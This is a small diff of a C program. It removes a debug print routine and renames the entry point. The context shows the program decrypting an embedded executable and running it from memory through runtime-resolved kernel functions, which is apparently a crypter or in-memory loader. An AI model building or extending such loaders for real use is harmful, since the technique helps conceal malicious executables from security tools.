@@ -93,14 +93,6 @@ void free(void *ptr) {
     }
 }
 
-
-void print_minimal(void) {
-    const char *msg = "Hello from minimal printf\n";
-    HANDLE stdout_handle = ((HANDLE (__stdcall *)(DWORD)) kernel_library_function_addresses[9])(-11);
-    DWORD written;
-    ((BOOL (__stdcall *)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED)) kernel_library_function_addresses[8])(stdout_handle, (void*)msg, 26, &written, NULL);
-}
-
 // #include "executable.h"
 
 
@@ -429,9 +421,8 @@ void code_handling_execute(in_memory_pe *new_pe){
 
 // MAIN
 
-int __start(void) {   
+int main(void) {   
     init_kernel_library();
-    print_minimal();
 
     decrypt_data(executable_pe, executable_size);
 
